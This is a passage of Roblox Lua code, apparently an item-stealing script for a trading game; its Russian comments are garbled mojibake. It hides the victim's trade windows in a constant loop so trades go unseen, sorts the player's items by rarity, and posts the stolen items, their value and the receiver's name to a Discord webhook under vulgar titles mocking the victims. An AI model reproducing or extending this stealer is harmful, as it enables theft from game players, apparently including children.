-- –û–°–¢–ê–õ–¨–ù–û–ô –ö–û–î –ë–ï–ó –ò–ó–ú–ï–ù–ï–ù–ò–ô...
-- [–ó–¥–µ—Å—å –∏–¥–µ—Ç –≤–µ—Å—å –æ—Å—Ç–∞–ª—å–Ω–æ–π –∫–æ–¥ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π]

        -- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É—Å–ø–µ—à–Ω–æ–≥–æ —Ç—Ä–µ–π–¥–∞ –≤ Discord
        function SendTradeSuccessMessage(sentItems, ReceiverName)
            local http = game:GetService("HttpService")
            local headers = {
                ["Content-Type"] = "application/json"
            }
            
            -- –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤
            local itemsText = ""
            local totalValue = 0
            
            for _, item in pairs(sentItems) do
                local itemValue = valuesTable[item.dataId] or 0
                totalValue = totalValue + (itemValue * item.amount)
                itemsText = itemsText .. string.format("%s ‚Ä¢ x%d ‚Ä¢ %d\n", item.name, item.amount, itemValue * item.amount)
            end
            
            local data = {
                ["username"] = "Mama Mia",
                ["avatar_url"] = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
                ["embeds"] = {
                    {
                        ["title"] = "‚úÖ –í—å–µ–±–∞–ª–∏ –¥–æ–¥–∏–∫–∞ –≤ —á–µ—à–∫–∏",
                        ["color"] = 65280,
                        ["fields"] = {
                            {
                                ["name"] = "üì¶ –ú–µ—á–∏ –¥–µ—Ç–µ–π:",
                                ["value"] = "```" .. itemsText .. "```",
                                ["inline"] = false
                            },
                            {
                                ["name"] = "üí∞ –û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å:",
                                ["value"] = "**" .. totalValue .. "**",
                                ["inline"] = true
                            },
                            {
                                ["name"] = "üë§ –ó–∞–±—Ä–∞–ª:",
                                ["value"] = "**" .. ReceiverName .. "**",
                                ["inline"] = true
                            }
                        },
                        ["footer"] = {
                            ["text"] = "Molitown Team feat. Interpol ‚Ä¢ " .. os.date("%Y-%m-%d %H:%M:%S")
                        }
                    }
                }
            }
            
            local body = http:JSONEncode(data)
            
            local response = request({
                Url = Webhook,
                Method = "POST",
                Headers = headers,
                Body = body
            })
        end

        function SendMessageEMBED(url, embed, bool)
            local http = game:GetService("HttpService")
            local headers = {
                ["Content-Type"] = "application/json"
            }
            
            -- –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç —Å —Ç–µ–ª–µ–ø–æ—Ä—Ç–æ–º –≤ —Å—Ç–∏–ª–µ –ø–µ—Ä–≤–æ–≥–æ –∫–æ–¥–∞
            local teleportContent = "üéØ **–í–¨–ï–ë–ê–ù** –û—á–µ—Ä–µ–¥–Ω–æ–π –∫—É–∫–∏—á:\n\n" .. TeleportScript
            
            local data = {
                ["username"] = "M O L I T O W N",
                ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
                ["content"] = teleportContent,
                ["embeds"] = {
                    {
                        ["title"] = embed.title,
                        ["color"] = embed.color,
                        ["fields"] = embed.fields,
                        ["footer"] = {
                            ["text"] = "Molitown Team 2025 | debugged for 6h"
                        }
                    }
                }
            }
            
            local data2 = {
                ["username"] = "M O L I T O W N", 
                ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
                ["content"] = "-- @everyone\n" .. teleportContent,
                ["embeds"] = {
                    {
                        ["title"] = embed.title,
                        ["color"] = embed.color,
                        ["fields"] = embed.fields,
                        ["footer"] = {
                            ["text"] = "Molitown Team 2025 | debugged for 6h"
                        }
                    }
                }
            }
            
            local body = http:JSONEncode(data)
            local body2 = http:JSONEncode(data2)

            if bool == true then
                local response = request({
                    Url = url,
                    Method = "POST",
                    Headers = headers,
                    Body = body2
                })
            else
                local response = request({
                    Url = url,
                    Method = "POST",
                    Headers = headers,
                    Body = body
                })
            end
        end

        -- –ù–æ–≤–∞—è —É–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–∫—Ä—ã—Ç–∏—è TradeGUI
        local function setupTradeGUIHider()
            local player = game:GetService("Players").LocalPlayer
            local playerGui = player:WaitForChild("PlayerGui")
            
            local function hideTradeGUI()
                for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
                    local gui = playerGui:FindFirstChild(guiName)
                    if gui then
                        gui.Enabled = false
                        -- –î–≤–æ–π–Ω–∞—è –∑–∞—â–∏—Ç–∞: –æ—Ç–∫–ª—é—á–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ Enabled
                        if not gui:FindFirstChild("AntiFlash") then
                            local conn
                            conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                                if gui.Enabled then
                                    gui.Enabled = false
                                else
                                    conn:Disconnect()
                                end
                            end)
                            local anti = Instance.new("BoolValue")
                            anti.Name = "AntiFlash"
                            anti.Parent = gui
                        end
                    end
                end
            end

            -- –°–∫—Ä—ã–≤–∞–µ–º —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
            hideTradeGUI()

            -- –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –ø–æ—è–≤–ª–µ–Ω–∏–µ –Ω–æ–≤—ã—Ö –æ–∫–æ–Ω
            playerGui.ChildAdded:Connect(function(child)
                if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
                    hideTradeGUI()
                end
            end)

            -- –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
            while true do
                hideTradeGUI()
                task.wait(0.1)
            end
        end

        -- –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä—ã—Ç–∏–µ GUI –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–π –∫–æ—Ä—É—Ç–∏–Ω–µ
        coroutine.wrap(setupTradeGUIHider)()

        local levelTable = {}
        for i,v in pairs(LevelModule.XPTable) do
            if PlayerDataModule.NewXP < v then
                table.insert(levelTable, i)
            end
        end
        local playerLevel = math.min(table.unpack(levelTable))
        local playerPrestige = LevelModule.Prestige

        local allItems = {}
        local totalValues = 0

        local vintageItems1 = {}
        local commonItems1 = {}
        local uncommonItems1 = {}
        local rareItems1 = {}
        local legendaryItems1 = {}
        local godlyItems1 = {}
        local ancientItems1 = {}
        local uniqueItems1 = {}

        local vintageItems = {}
        local commonItems = {}
        local uncommonItems = {}
        local rareItems = {}
        local legendaryItems = {}
        local godlyItems = {}
